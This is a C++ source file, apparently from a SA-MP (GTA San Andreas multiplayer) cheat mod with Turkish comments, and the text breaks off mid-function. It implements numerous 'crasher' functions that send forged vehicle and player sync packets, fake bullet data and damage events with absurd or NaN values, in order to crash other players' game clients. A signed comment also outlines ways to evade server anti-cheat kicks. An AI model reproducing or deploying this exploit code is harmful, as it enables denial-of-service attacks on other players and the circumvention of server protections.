#include "main.h"
#if COMPILE_TYPE == COMPILE_TYPE_TURKISH_THELIFE_VERSION || COMPILE_TYPE == COMPILE_TYPE_TURKISH_HELLSIDE_VERSION || COMPILE_TYPE == COMPILE_TYPE_TURKISH_RAPIDFIRE_VERSION
void CCrasher()
{
#define INVALID_BULLETS_HIGH_SPEED 1
#define INVALID_BULLETS_LOW_SPEED 2
#define INVALID_BULLETS_NEGATIVE_SPEED 3
	if (cheat_state->crasher.uiInvalidBulletsCrasherType)
	{
		actor_info* ainfo = actor_info_get(ACTOR_SELF, ACTOR_ALIVE);
		if (!ainfo)
		{
			addMessageToChatWindow("Oyuncu bilgisi bulunamadı, crasher kapatıldı.");
			cheat_state->crasher.uiInvalidBulletsCrasherType = NULL;
			return;
		}
		vehicle_info* vehicleInfo = GetVehicleInfoStandart(VEHICLE_ALIVE | VEHICLE_NOT_TRAIN, VEHICLE_CLOSEST);
		if (!vehicleInfo)
		{
			addMessageToChatWindow("Yakında araç bulunamadı, crasher kapatıldı.");
			cheat_state->crasher.uiInvalidBulletsCrasherType = NULL;
			return;
		}
		static DWORD dwCrasherSendRate = 250;
		float fPosition[3];
		float fRoll[3] = { 1,1,1 };
		BYTE bFireableWeapons[] = { 24,25,26,27,28,29,30,31,32,33,34,38 };
		float fTurningSpeed[3] = { -0xCCC };
		vect3_copy(&ainfo->base.matrix[12], fPosition);
		int vehicleID = getSAMPVehicleIDFromGTAVehicle(vehicleInfo);
		switch (cheat_state->crasher.uiInvalidBulletsCrasherType)
		{
			case INVALID_BULLETS_HIGH_SPEED:
			{
				if (bFireableWeapons[g_Players->pLocalPlayer->byteCurrentWeapon])
				{
					cheat_state_text("Ateşlenebilir silahlardan biri var.");
					if (GetTickCount() - dwCrasherSendRate > 250)
					{
						vect3_copy(&vehicleInfo->base.matrix[12], fPosition);
						g_RakClient->SendEnterPlayerVehicle(vehicleID, 0);
						cheat_state_text("Binildi.");
						g_RakClient->SendFakeUnoccupiedSyncData(vehicleID, 0, fPosition, vehicleInfo->speed, vehicleInfo->hitpoints, fTurningSpeed, fRoll);
						g_RakClient->SendExitPlayerVehicle(vehicleID);
						dwCrasherSendRate = GetTickCount();
					}
				}
			}break;
			case INVALID_BULLETS_LOW_SPEED:
			{
				if (bFireableWeapons[g_Players->pLocalPlayer->byteCurrentWeapon])
				{
					cheat_state_text("Ateşlenebilir silahlardan biri var.");
					if (GetTickCount() - dwCrasherSendRate > 250)
					{
						vect3_copy(&vehicleInfo->base.matrix[12], fPosition);
						g_RakClient->SendEnterPlayerVehicle(vehicleID, 0);
						cheat_state_text("Binildi.");
						g_RakClient->SendFakeUnoccupiedSyncData(vehicleID, 0, fPosition, vehicleInfo->speed, vehicleInfo->hitpoints, fTurningSpeed, fRoll);
						g_RakClient->SendExitPlayerVehicle(vehicleID);
						dwCrasherSendRate = GetTickCount();
					}
				}
			}break;
			case INVALID_BULLETS_NEGATIVE_SPEED:
			{
				if (bFireableWeapons[g_Players->pLocalPlayer->byteCurrentWeapon])
				{
					cheat_state_text("Ateşlenebilir silahlardan biri var.");
					if (GetTickCount() - dwCrasherSendRate > 250)
					{
						vect3_copy(&vehicleInfo->base.matrix[12], fPosition);
						g_RakClient->SendEnterPlayerVehicle(vehicleID, 0);
						cheat_state_text("Binildi.");
						g_RakClient->SendFakeUnoccupiedSyncData(vehicleID, 0, fPosition, vehicleInfo->speed, vehicleInfo->hitpoints, fTurningSpeed, fRoll);
						g_RakClient->SendExitPlayerVehicle(vehicleID);
						dwCrasherSendRate = GetTickCount();
					}
				}
			}break;
			default:
				break;
		}
		
	}
	if (cheat_state->crasher.uiRollCrasherType)
	{

	}
}
void C_PassengerCrasher()
{
	if (cheat_state->crasher.iPublicPassengerCrasher)
	{
		static DWORD tick = 250;
		DWORD now_tick = GetTickCount();
		if (now_tick - tick > 250)
		{
			actor_info *self = actor_info_get(ACTOR_SELF, NULL);
			if (!self)
				return;

			vehicle_info * vehicle = GetVehicleInfoStandart(VEHICLE_ALIVE | VEHICLE_NOT_TRAIN, VEHICLE_CLOSEST);

			if (!vehicle)
				return;
			
			float fPos[3] = { 9910000000000.0F, 9910000000000.0F, 991000000000.0F };
			float fRoll[3] = { 1, 1, 1 }; // Crasher için gerekli.

			fPos[0] += 0.5f;
			int iVehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);

			vect3_copy(&self->base.matrix[12], fPos);
			if (KEY_DOWN(VK_LBUTTON))
			{
				g_RakClient->SendEnterPlayerVehicle(iVehicleID, 0);
				g_RakClient->SendFakeUnoccupiedSyncData(iVehicleID, 0, fPos, vehicle->speed, vehicle->hitpoints, vehicle->spin, fRoll);
				g_RakClient->SendExitPlayerVehicle(iVehicleID);
			}
			tick = now_tick;
		}
	}
}

void C_HighfRollCrasher() 
{
	if (cheat_state->crasher.iRollCrasher1)
	{
		static DWORD tick = 200;
		DWORD now_tick = GetTickCount();
		if(KEY_DOWN(VK_LBUTTON))
		{
			actor_info* self = actor_info_get(ACTOR_SELF, NULL);
			if (!self)
				return;

			vehicle_info* vehicle =
				GetVehicleInfoStandart(
					VEHICLE_NOT_OCCUPIED |
					VEHICLE_NOT_CLOSED,
					VEHICLE_CLOSEST |
					VEHICLE_NOT_MY |
					VEHICLE_ALIVE |
					VEHICLE_NOT_TRAIN);

			if (!vehicle)
				return;

			float fPos[3];
			float fRoll[3] = { 9910000000000.0F, 9910000000000.0F, 991000000000.0F };

			vect3_copy(&self->base.matrix[12], fPos);
			int iVehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);
			if (GetTickCount() - tick > 200)
			{
				g_RakClient->SendEnterPlayerVehicle(iVehicleID, 0);
				g_RakClient->SendFakeUnoccupiedSyncData(iVehicleID, 0, fPos, vehicle->speed, vehicle->hitpoints = 1000, &vehicle->base.matrix[0], fRoll);
				g_RakClient->SendExitPlayerVehicle(iVehicleID);
				tick = now_tick;
			}
			
		}
	}
}

void C_RemovePlayerCrasher()
{
	if (cheat_state->crasher.iPublicRemovePlayerCrasher)
	{
		patch_set* pspp = &set.patch[18];
		patcher_install(pspp);
		float fPos_[3];
		float* coord = (cheat_state->state == CHEAT_STATE_VEHICLE) ? cheat_state->vehicle.coords : cheat_state->actor.coords;
		fPos_[0] = coord[0], fPos_[1] = coord[1], fPos_[2] = coord[2];
		bool static foot_state = false;

		static DWORD tick = 150;

		DWORD now_tick = GetTickCount();

		if (now_tick - tick > 150) // Delay 280'den 150'ye düşürüldü.
		{
			static bool normalize = false;

			if (!foot_state)
			{
				stOnFootData footData;
				ZeroMemory(&footData, sizeof(stOnFootData));

				footData.fPosition[0] = coord[0];
				footData.fPosition[1] = coord[1];
				footData.fPosition[2] = coord[2];

				footData.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
				footData.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
				footData.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];

				footData.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
				footData.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;

				RakNet::BitStream bsData;
				bsData.Write((BYTE)ID_PLAYER_SYNC);
				bsData.Write((PCHAR)&footData, sizeof(stOnFootData));
				for (int i = 0; i < 2; i++)
					g_RakClient->Send(&bsData);
				foot_state = true;
			}
			else
			{
				RakNet::BitStream bs;
				for (int i = 0; i < 2; i++)
				g_RakClient->RPC(RPC_Spawn, &bs);
				foot_state = false;
			}
			tick = now_tick;
		}
	}
	else
	{
		patch_set* pspp = &set.patch[18];
		patcher_remove(pspp);
	}
}
void C_TuningCrasher()
{
	if (cheat_state->crasher.iPublicTuningCrasher)
	{
		actor_info *me = actor_info_get(VEHICLE_SELF, NULL);
		if (me->state != CHEAT_STATE_VEHICLE)
		{
			vehicle_info * vehicle =
				GetVehicleInfoStandart(
					VEHICLE_NOT_OCCUPIED |
					VEHICLE_NOT_CLOSED,
					VEHICLE_NEXT |
					VEHICLE_NOT_MY |
					VEHICLE_CARS_ONLY |
					VEHICLE_NOT_TRAIN);
			if (!vehicle)
				return;
			g_RakClient->SendFakeDriverSyncData(getSAMPVehicleIDFromGTAVehicle(vehicle), vehicle->base.matrix + 12, vehicle->hitpoints, vehicle->speed);
			sendSCMEvent(2, getSAMPVehicleIDFromGTAVehicle(vehicle), 1000 + rand() % 199, NULL);
		}
		else
		{
			sendSCMEvent(2, g_Players->pLocalPlayer->sLastVehicleID, 1000 + rand() % 199, NULL);
		}

	}
}
 
/*
-> Crash atılabilecek datalar.
	
	int16_t sVehicleID;
	uint8_t byteSeatID;
	float	fRoll[3];
	float	fDirection[3];
	float	fPosition[3];
	float	fMoveSpeed[3];
	float	fTurnSpeed[3];
	
*/

void C_InvalidBulletsCrasher1()
{
	if (cheat_state->crasher.iInvalidBulletsCrasher1)
	{
		static DWORD tick = set.invalidBullets.dwDelayOfInvalidBullets;
		DWORD now_tick = GetTickCount();
		if (now_tick - tick > set.invalidBullets.dwDelayOfInvalidBullets)
		{
	
			actor_info* self = actor_info_get(ACTOR_SELF, NULL);
			if (!self)
				return;

			vehicle_info* vehicle =
				GetVehicleInfoStandart(
					VEHICLE_NOT_OCCUPIED |
					VEHICLE_NOT_CLOSED,
					VEHICLE_NEXT |
					VEHICLE_NOT_MY |
					VEHICLE_ALIVE |
					VEHICLE_NOT_TRAIN);

			if (!vehicle)
				return;

			int VehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);

			if (KEY_DOWN(VK_LBUTTON))
			{
				float fPos[3];

				vect3_copy(vehicle->base.matrix + 12, fPos);
				int PlayerID = GetClosestPlayerid(self, GetActorFlag(true, false, false, true, false, false, false, false));

				float fOrigin[3], fTarget[3], fCenter[3];
				actor_info* deadman = getGTAPedFromSAMPPlayerID(PlayerID);
				if (!deadman)
					return;

				vect3_copy(&self->base.matrix[4 * 3], fOrigin);
				vect3_copy(&deadman->base.matrix[4 * 3], fTarget);
				fCenter[0] = -0.01f;
				fCenter[1] = -0.02f;
				fCenter[2] = 0.04f;
				int WeaponID = g_Players->pLocalPlayer->byteCurrentWeapon;
				if (cheack_valid_weaponid(WeaponID))
				{
					g_RakClient->SendFakeBulletData(PlayerID, fOrigin, fTarget, fCenter, WeaponID, BULLET_HIT_TYPE_PLAYER);
					stOnFootData onSync;
					ZeroMemory(&onSync, sizeof(stOnFootData));
					onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
					onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
					onSync.fPosition[0] = fPos[0];
					onSync.fPosition[1] = fPos[1];
					onSync.fPosition[2] = set.invalidBullets.fOnFootPosZ;
					onSync.fSurfingOffsets[2] = -5.4f;
					onSync.sSurfingVehicleID = VehicleID;
					RakNet::BitStream bsData;
					bsData.Write((BYTE)ID_PLAYER_SYNC);
					bsData.Write((PCHAR)&onSync, sizeof(stOnFootData));
					g_RakClient->Send(&bsData, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
					stUnoccupiedData unSync;
					ZeroMemory(&unSync, sizeof(stUnoccupiedData));
					unSync.sVehicleID = VehicleID;
					unSync.fPosition[0] = fPos[0];
					unSync.fPosition[1] = fPos[1];
					unSync.fPosition[2] = set.invalidBullets.fOnFootPosZ;
					unSync.fHealth = vehicle->hitpoints;
					unSync.fMoveSpeed[0] = vehicle->speed[0];
					unSync.fMoveSpeed[1] = vehicle->speed[1];
					unSync.fMoveSpeed[2] = vehicle->speed[2];
					unSync.fRoll[0] = 1;
					unSync.fRoll[1] = 1;
					unSync.fRoll[2] = 1;
					unSync.fDirection[0] = 0;
					unSync.fDirection[1] = 1;
					unSync.fDirection[2] = 0;
					unSync.fTurnSpeed[0] = 0x15F90;
					unSync.fTurnSpeed[1] = 0x15F90;
					unSync.fTurnSpeed[2] = 0x15F90;
					unSync.byteSeatID = 1;
//#if COMPILE_TYPE == COMPILE_TYPE_TURKISH_RAPIDFIRE_VERSION
//					cheat_state_text("fTurnSpeed -> X: %0.2f", unSync.fTurnSpeed[0]);
//#endif
					RakNet::BitStream bsUnoccupiedSync;
					bsUnoccupiedSync.Write((BYTE)ID_UNOCCUPIED_SYNC);
					bsUnoccupiedSync.Write((PCHAR)&unSync, sizeof(stUnoccupiedData));
					g_RakClient->Send(&bsUnoccupiedSync);
					tick = now_tick;
				}
			}
			tick = now_tick;
		}
	}
}

void C_InvalidBulletsCrasher2()
{
	if (cheat_state->crasher.iInvalidBulletsCrasher2)
	{
		static DWORD tick = set.invalidBullets.dwDelayOfInvalidBullets;
		DWORD now_tick = GetTickCount();
		if (now_tick - tick > set.invalidBullets.dwDelayOfInvalidBullets)
		{

			actor_info* self = actor_info_get(ACTOR_SELF, NULL);
			if (!self)
				return;

			vehicle_info* vehicle =
				GetVehicleInfoStandart(
					VEHICLE_NOT_OCCUPIED |
					VEHICLE_NOT_CLOSED,
					VEHICLE_NEXT |
					VEHICLE_NOT_MY |
					VEHICLE_ALIVE |
					VEHICLE_NOT_TRAIN);

			if (!vehicle)
				return;

			int VehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);

			if (KEY_DOWN(VK_LBUTTON))
			{
				float fPos[3];

				vect3_copy(vehicle->base.matrix + 12, fPos);
				int PlayerID = GetClosestPlayerid(self, GetActorFlag(true, false, false, true, false, false, false, false));

				float fOrigin[3], fTarget[3], fCenter[3];
				actor_info* deadman = getGTAPedFromSAMPPlayerID(PlayerID);
				if (!deadman)
					return;

				vect3_copy(&self->base.matrix[4 * 3], fOrigin);
				vect3_copy(&deadman->base.matrix[4 * 3], fTarget);
				fCenter[0] = -0.01f;
				fCenter[1] = -0.02f;
				fCenter[2] = 0.04f;
				int WeaponID = g_Players->pLocalPlayer->byteCurrentWeapon;
				if (cheack_valid_weaponid(WeaponID))
				{
					g_RakClient->SendFakeBulletData(PlayerID, fOrigin, fTarget, fCenter, WeaponID, BULLET_HIT_TYPE_PLAYER);
					stOnFootData onSync;
					ZeroMemory(&onSync, sizeof(stOnFootData));
					onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
					onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
					onSync.fPosition[0] = fPos[0];
					onSync.fPosition[1] = fPos[1];
					onSync.fPosition[2] = set.invalidBullets.fOnFootPosZ;
					onSync.fSurfingOffsets[2] = -5.4f;
					onSync.sSurfingVehicleID = VehicleID;
					RakNet::BitStream bsData;
					bsData.Write((BYTE)ID_PLAYER_SYNC);
					bsData.Write((PCHAR)&onSync, sizeof(stOnFootData));
					g_RakClient->Send(&bsData, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
					stUnoccupiedData unSync;
					ZeroMemory(&unSync, sizeof(stUnoccupiedData));
					unSync.sVehicleID = VehicleID;
					unSync.fPosition[0] = fPos[0];
					unSync.fPosition[1] = fPos[1];
					unSync.fPosition[2] = set.invalidBullets.fOnFootPosZ;
					unSync.fHealth = vehicle->hitpoints;
					unSync.fMoveSpeed[0] = vehicle->speed[0];
					unSync.fMoveSpeed[1] = vehicle->speed[1];
					unSync.fMoveSpeed[2] = vehicle->speed[2];
					unSync.fRoll[0] = 1;
					unSync.fRoll[1] = 1;
					unSync.fRoll[2] = 1;
					unSync.fDirection[0] = 0;
					unSync.fDirection[1] = 1;
					unSync.fDirection[2] = 0;
					unSync.fTurnSpeed[0] = 10001.0F;
					unSync.fTurnSpeed[1] = 10001.0F;
					unSync.fTurnSpeed[2] = 10001.0F;
					unSync.byteSeatID = 1;
					RakNet::BitStream bsUnoccupiedSync;
					bsUnoccupiedSync.Write((BYTE)ID_UNOCCUPIED_SYNC);
					bsUnoccupiedSync.Write((PCHAR)&unSync, sizeof(stUnoccupiedData));
					g_RakClient->Send(&bsUnoccupiedSync, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
					tick = now_tick;
				}
			}
			tick = now_tick;
		}
	}
}

void C_InvalidBulletsCrasher3()
{
	if (cheat_state->crasher.iInvalidBulletsCrasher3)
	{
		static DWORD tick = set.invalidBullets.dwDelayOfInvalidBullets;
		DWORD now_tick = GetTickCount();
		if (now_tick - tick > set.invalidBullets.dwDelayOfInvalidBullets)
		{

			actor_info* self = actor_info_get(ACTOR_SELF, NULL);
			if (!self)
				return;

			vehicle_info* vehicle =
				GetVehicleInfoStandart(
					VEHICLE_NOT_OCCUPIED |
					VEHICLE_NOT_CLOSED,
					VEHICLE_NEXT |
					VEHICLE_NOT_MY |
					VEHICLE_ALIVE |
					VEHICLE_NOT_TRAIN);

			if (!vehicle)
				return;

			int VehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);

			if (KEY_DOWN(VK_LBUTTON))
			{
				float fPos[3];

				vect3_copy(vehicle->base.matrix + 12, fPos);
				int PlayerID = GetClosestPlayerid(self, GetActorFlag(true, false, false, true, false, false, false, false));

				float fOrigin[3], fTarget[3], fCenter[3];
				actor_info* deadman = getGTAPedFromSAMPPlayerID(PlayerID);
				if (!deadman)
					return;

				vect3_copy(&self->base.matrix[4 * 3], fOrigin);
				vect3_copy(&deadman->base.matrix[4 * 3], fTarget);
				fCenter[0] = -0.01f;
				fCenter[1] = -0.02f;
				fCenter[2] = 0.04f;
				int WeaponID = g_Players->pLocalPlayer->byteCurrentWeapon;
				if (cheack_valid_weaponid(WeaponID))
				{
					float frandomcrasher = random_float(1500.0f, 10000.0f);
					g_RakClient->SendFakeBulletData(PlayerID, fOrigin, fTarget, fCenter, WeaponID, BULLET_HIT_TYPE_PLAYER);
					if (set.invalidBullets.bSendGiveDamage)
						g_RakClient->SendGiveDamage(PlayerID, fWeaponDamage[WeaponID], WeaponID, 3);
					stOnFootData onSync;
					ZeroMemory(&onSync, sizeof(stOnFootData));
					onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
					onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
					onSync.fPosition[0] = fPos[0];
					onSync.fPosition[1] = fPos[1];
					onSync.fPosition[2] = set.invalidBullets.fOnFootPosZ;
					onSync.fSurfingOffsets[2] = -5.4f;
					onSync.sSurfingVehicleID = VehicleID;
					RakNet::BitStream bsData;
					bsData.Write((BYTE)ID_PLAYER_SYNC);
					bsData.Write((PCHAR)&onSync, sizeof(stOnFootData));
					g_RakClient->Send(&bsData, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
					stUnoccupiedData unSync;
					ZeroMemory(&unSync, sizeof(stUnoccupiedData));
					unSync.sVehicleID = VehicleID;
					unSync.fPosition[0] = fPos[0];
					unSync.fPosition[1] = fPos[1];
					unSync.fPosition[2] = set.invalidBullets.fOnFootPosZ;
					unSync.fHealth = vehicle->hitpoints;
					unSync.fMoveSpeed[0] = vehicle->speed[0];
					unSync.fMoveSpeed[1] = vehicle->speed[1];
					unSync.fMoveSpeed[2] = vehicle->speed[2];
					unSync.fRoll[0] = 1;
					unSync.fRoll[1] = 1;
					unSync.fRoll[2] = 1;
					unSync.fDirection[0] = 0;
					unSync.fDirection[1] = 1;
					unSync.fDirection[2] = 0;
					unSync.fTurnSpeed[0] = frandomcrasher;
					unSync.fTurnSpeed[1] = frandomcrasher;
					unSync.fTurnSpeed[2] = frandomcrasher;
					unSync.byteSeatID = 1;
//#if COMPILE_TYPE == COMPILE_TYPE_TURKISH_RAPIDFIRE_VERSION
//					cheat_state_text("fTurnSpeed -> X: %0.2f", unSync.fTurnSpeed[0]);
//#endif
					g_RakClient->SendEnterPlayerVehicle(VehicleID, unSync.byteSeatID);
					RakNet::BitStream bsUnoccupiedSync;
					bsUnoccupiedSync.Write((BYTE)ID_UNOCCUPIED_SYNC);
					bsUnoccupiedSync.Write((PCHAR)&unSync, sizeof(stUnoccupiedData));
					g_RakClient->Send(&bsUnoccupiedSync, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		/*			g_RakClient->SendExitPlayerVehicle(VehicleID);*/
					tick = now_tick;
				}
			}
			tick = now_tick;
		}
	}
}
/*
	bu n surf ile posiyonu kopyalayip karşinin invaild value gönnderiyor
	siksen çalişmaz hiç bi yerde
	ben olsam unocu surfu vs çikaririm direk direc ve dur neydi onun adı
	bi sn
	posX ve Y noplar Zye neg value koyarim, noplu spec atar camtypeı 3e çekerim
	invaid bullette spec bypassliyr ve millet hala bunu bilmiyosa aq
	tabi ilk yapilacak şey fbllet kullanmamak bunun için, fakebullet vs eyvallah valid bi silahın emülasyonunu yapsan daa garantisi olur
	bunuda iki şeyle başarirsin, ateş ettiğinde kickleyen serverler genelde onWepShot kullanir ve sahte pos gönderirsin her saniyede 0.0.0 gibi mesela ondan sonra kendi posiyonunu atarsin ve silah modelini destroylarsin
	~ Ezel.
*/
void C_InvalidBulletsCrasher4()
{
	if (cheat_state->crasher.iInvalidBulletsCrasher4)
	{
		static DWORD tick = set.invalidBullets.dwDelayOfInvalidBullets;
		DWORD now_tick = GetTickCount();	
		float fSpin[3] = { -10000.0f, -10000.0f,-10000.0f }, fRoll[3] = { -1,-1,-1 };
		if (now_tick - tick > set.invalidBullets.dwDelayOfInvalidBullets)
		{
			actor_info* self = actor_info_get(ACTOR_SELF, NULL);
			if (!self)
				return;
			vehicle_info* vehicle =
				GetVehicleInfoStandart(
					VEHICLE_NOT_OCCUPIED |
					VEHICLE_NOT_CLOSED,
					VEHICLE_NEXT |
					VEHICLE_NOT_MY |
					VEHICLE_ALIVE |
					VEHICLE_NOT_TRAIN);

			if (!vehicle)
				return;

			int VehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);

			if (KEY_DOWN(VK_LBUTTON))
			{
				float fPos[3];
				vect3_copy(vehicle->base.matrix + 12, fPos);
				int PlayerID = GetClosestPlayerid(self, GetActorFlag(true, false, false, true, false, false, false, false));
				float fOrigin[3], fTarget[3], fCenter[3];
				actor_info* deadman = getGTAPedFromSAMPPlayerID(PlayerID);
				if (!deadman)
					return;
				vect3_copy(&self->base.matrix[4 * 3], fOrigin);
				vect3_copy(&deadman->base.matrix[4 * 3], fTarget);
				fCenter[0] = -0.01f;
				fCenter[1] = -0.02f;
				fCenter[2] = 0.04f;
				int WeaponID = g_Players->pLocalPlayer->byteCurrentWeapon;
				if (cheack_valid_weaponid(WeaponID))
				{
					float frandomcrasher = random_float(-1000.0f, -10000.0f);
					g_RakClient->SendGiveDamage(PlayerID, fWeaponDamage[WeaponID], WeaponID, 3);
					//g_RakClient->SendFakeBulletData(PlayerID, fOrigin, fTarget, fCenter, WeaponID, BULLET_HIT_TYPE_PLAYER);
					stOnFootData onSync;
					ZeroMemory(&onSync, sizeof(stOnFootData));
					onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
					onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
					vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], onSync.fPosition);
					//onSync.fPosition[2] = set.invalidBullets.fOnFootPosZ;
					/*onSync.fSurfingOffsets[2] = -5.5f;
					onSync.sSurfingVehicleID = VehicleID;*/
					RakNet::BitStream bsData;
					bsData.Write((BYTE)ID_PLAYER_SYNC);
					bsData.Write((PCHAR)&onSync, sizeof(stOnFootData));
					g_RakClient->Send(&bsData);
					g_RakClient->SendFakeUnoccupiedSyncData(VehicleID, 0, fPos, vehicle->speed, vehicle->hitpoints, fSpin, fRoll);
					tick = now_tick;
				}
			}
		}
	}
}
void C_RollCrasher2()
{
	if (cheat_state->crasher.iRollCrasher2)
	{
		static DWORD tick = 1000;
		DWORD now_tick = GetTickCount();
			actor_info* self = actor_info_get(ACTOR_SELF, NULL);
			if (!self)
				return;

			vehicle_info* vehicle =
				GetVehicleInfoStandart(
					VEHICLE_NOT_OCCUPIED |
					VEHICLE_NOT_CLOSED,
					VEHICLE_CLOSEST |
					VEHICLE_NOT_MY |
					VEHICLE_ALIVE |
					VEHICLE_NOT_TRAIN);

			if (!vehicle)
				return;

			float fPos[3] = { 20000.0f, 20000.0f, 20000.0f };
			float fRoll[3] = { -1,1,-1 };

			vect3_copy(&self->base.matrix[12], fPos);
			/*	vehicle->base.matrix[4 * 1 + 1];
				vehicle->base.matrix[4 * 1 - 1];*/
				//fPos[0] += 5.0;
			int iVehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);
			if (GetTickCount() - tick >= 1000)
			{
				g_RakClient->SendEnterPlayerVehicle(iVehicleID, 0);
				g_RakClient->SendFakeUnoccupiedSyncData(iVehicleID, 0, fPos, vehicle->speed, vehicle->hitpoints, &vehicle->spin[0], fRoll);
				g_RakClient->SendExitPlayerVehicle(iVehicleID);
				tick = now_tick;
			}
		}
}

void C_DirectionCrasher1()
{
	if (cheat_state->crasher.iDirectionCrasher1)
	{
		if (KEY_DOWN(VK_LBUTTON))
		{
		actor_info* self = actor_info_get(ACTOR_SELF, NULL);
		if (!self)
			return;
		float fDirection[3] = { -50000.0f, -50000.0f, -50000.0f};
		float fPos[3];
		float fRoll[3] = { 1,0,1 };
		fPos[0] += 5.0;
		vehicle_info* vehicle =
			GetVehicleInfoStandart(
				VEHICLE_NOT_OCCUPIED |
				VEHICLE_NOT_CLOSED,
				VEHICLE_NEXT |
				VEHICLE_NOT_MY |
				VEHICLE_ALIVE |
				VEHICLE_NOT_TRAIN);

		if (!vehicle)
			return;

		int VehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);
		static DWORD tick = 100;

		DWORD now_tick = GetTickCount();

		if (now_tick - tick > 100)
		{
			vect3_copy(&self->base.matrix[12], fPos);
			
				if (self->state == CHEAT_STATE_ACTOR)
				{
					//cheat_state_text("fRoll-Roll[0] = %f", fRoll[0]);
					g_RakClient->SendEnterPlayerVehicle(VehicleID, 1);
					g_RakClient->SendFullFakeUnoccupiedFuckingSyncData(VehicleID, 1, fDirection, fPos, vehicle->speed, vehicle->hitpoints = 1000, &vehicle->base.matrix[0], fRoll);
					g_RakClient->SendExitPlayerVehicle(VehicleID);
					tick = now_tick;
				}
				tick = now_tick;
			}
		}
	}
}
void C_DirectionCrasher2()
{
	if (cheat_state->crasher.iDirectionCrasher2)
	{
		actor_info* self = actor_info_get(ACTOR_SELF, NULL);
		if (!self)
			return;
		/*float fRandomDirection[3] = { random_float(1000.0f, 10000.0f) };*/
		float fRoll[3] = { 1,0,1 };
		float fPos[3];
		float fDirection[3] = { 9750.0f, 10000.0f, 50010.0f };
		float fTurnSpeed[3] = { sqrt((float)-1), sqrt((float)-1), sqrt((float)-1) };
		fPos[0] += 5.0;
		vehicle_info* vehicle =
			GetVehicleInfoStandart(
				VEHICLE_NOT_OCCUPIED |
				VEHICLE_NOT_CLOSED,
				VEHICLE_NEXT |
				VEHICLE_NOT_MY |
				VEHICLE_ALIVE |
				VEHICLE_NOT_TRAIN);

		if (!vehicle)
			return;

		int VehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);
		static DWORD tick = 100;

		DWORD now_tick = GetTickCount();
		if (KEY_DOWN(VK_LBUTTON))
		{
			if (now_tick - tick >100)
			{
			vect3_copy(&self->base.matrix[12], fPos);
			
				if (self->state == CHEAT_STATE_ACTOR)
				{
					//cheat_state_text("fRoll-Roll[0] = %f", fRoll[0]);
					g_RakClient->SendEnterPlayerVehicle(VehicleID, 1);
					g_RakClient->SendFullFakeUnoccupiedFuckingSyncData(VehicleID, 1, fDirection, fPos, vehicle->speed, vehicle->hitpoints = 1000, fTurnSpeed, fRoll);
					g_RakClient->SendExitPlayerVehicle(VehicleID);
					tick = now_tick;
				}
				tick = now_tick;
			}
			
		}
	}
}
void GameSoundCrasher()
{
	if (cheat_state->crasher.iGameSoundCrasher)
	{
		static DWORD tick = 500;
		DWORD now_tick = GetTickCount();
		if (now_tick - tick > 500)
		{
			actor_info* self = actor_info_get(ACTOR_SELF, NULL);
			if (!self)
				return;
			vehicle_info* vehicle =
				GetVehicleInfoStandart(
					VEHICLE_NOT_OCCUPIED |
					VEHICLE_NOT_CLOSED,
					VEHICLE_NEXT |
					VEHICLE_NOT_MY |
					VEHICLE_ALIVE |
					VEHICLE_NOT_TRAIN);
			if (!vehicle)
				return;
			//tick = now_tick;
			float fRoll[3] = { vehicle->base.matrixStruct->right.X, vehicle->base.matrixStruct->right.Y, vehicle->base.matrixStruct->right.Z };
			float fPos[3];
			float fDirection[3] = { vehicle->base.matrixStruct->up.X, vehicle->base.matrixStruct->up.Y, vehicle->base.matrixStruct->up.Z }; // fSoundCrasher'in Z ekseninin değerini 1111.0f'ten, 999.9f'e çektim.
			float fSoundCrasherValue[3] = { -1000.f, 1000.0f, -1000.0f };
			float fCrasherPos[3] = { 15600.0f, 15600.0f, 15600.0f };
			int VehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);
			vect3_copy(&self->base.matrix[12], fPos);
			fPos[1] += 0.5f;
			if (KEY_DOWN(VK_LBUTTON))
			{
				if (self->state == CHEAT_STATE_ACTOR)
				{
					stOnFootData onSync;
					ZeroMemory(&onSync, sizeof(stOnFootData));
					onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
					onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
					onSync.fPosition[0] = fPos[0];
					onSync.fPosition[1] = fPos[1];
					onSync.fPosition[2] = fPos[2];
					onSync.fSurfingOffsets[2] = g_Players->pLocalPlayer->onFootData.fSurfingOffsets[2];
					onSync.sSurfingVehicleID = VehicleID;
					RakNet::BitStream bsData;
					bsData.Write((BYTE)ID_PLAYER_SYNC);
					bsData.Write((PCHAR)&onSync, sizeof(stOnFootData));
					g_RakClient->Send(&bsData);
					g_RakClient->SendEnterPlayerVehicle(VehicleID, 0);
